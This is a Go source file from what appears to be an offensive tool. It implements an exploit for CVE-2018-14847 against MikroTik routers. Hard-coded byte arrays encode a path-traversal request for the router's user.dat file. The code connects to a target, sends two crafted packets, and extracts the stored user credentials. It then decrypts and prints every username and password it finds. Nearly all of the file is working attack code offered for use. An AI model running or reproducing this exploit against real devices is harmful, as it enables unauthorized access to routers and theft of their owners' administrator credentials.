package exploit

import (
	"fmt"
	"net"

	"github.com/seaung/gagako/pkg/utils"
)

var (
	firstRequest = []byte{
		0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
		0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
		0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
		0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
		0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
		0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
		0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
		0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
		0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
		0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
		0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
		0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
		0x00, 0x00,
	}
	secondRequest = []byte{
		0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
		0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
		0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
		0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
		0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
		0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
		0x00, 0x02, 0x00, 0x00, 0x00,
	}
)

func ExploitCVE201814847(host, port string) {
	var data []byte
	var err error

	if data, err = connector2Router(host, port); err != nil {
		utils.New().LoggerError(fmt.Sprintf("connect to router error : %v\n", err))
	}

	users, err := utils.GetUserAndDecryptPassword(data)
	if err != nil {
		utils.New().LoggerError(fmt.Sprintf("get user and decrypt password error : %v\n", err))
	}

	for _, user := range users {
		utils.New().Success(fmt.Sprintf("the target : %s username : %s - password : %s\n", host, user.Username, user.Password))
	}
}

func connector2Router(host, port string) ([]byte, error) {
	buffer := make([]byte, 1024)
	connect, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
	if err != nil {
		return nil, err
	}

	defer func() {
		if err := connect.Close(); err != nil {
			utils.New().LoggerError(fmt.Sprintf("close connector error %s", err))
		}
	}()

	if _, err := connect.Write(firstRequest); err != nil {
		return nil, err
	}

	if _, err := connect.Read(buffer); err != nil {
		return nil, err
	}

	secondRequest[19] = buffer[38]
	if _, err := connect.Write(secondRequest); err != nil {
		return nil, err
	}

	if _, err := connect.Read(buffer); err != nil {
		return nil, err
	}

	return buffer[55:], nil
}
